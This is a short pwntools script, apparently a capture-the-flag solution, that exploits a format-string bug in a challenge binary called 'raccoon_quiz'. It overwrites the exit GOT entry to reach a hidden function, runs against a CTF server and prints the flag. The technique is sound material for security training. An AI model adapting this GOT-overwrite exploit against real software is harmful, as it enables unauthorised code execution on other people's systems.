from pwn import *
from pwnlib.fmtstr import fmtstr_payload

# set context for 64 bit payload
context(arch="amd64", os="linux", endian="little")

# get function addresses from local binary and make payload
raccoon_bin = ELF("./raccoon_quiz")
exit_addr = raccoon_bin.got["exit"]
sneaky_addr = raccoon_bin.symbols["super_sneaky_function"]
payload = fmtstr_payload(6, {exit_addr: sneaky_addr})

# connect to remote instance
r = remote("chal.ctf-league.osusec.org", 4816)

# answer the quiz questions and get all program output
r.send(b"A\nB\nA\n")
r.recvuntil(b"leaderboards!")

# send payload and print flag
r.sendline(payload)
r.recvuntil(b"flag.\n")
print(r.recvline())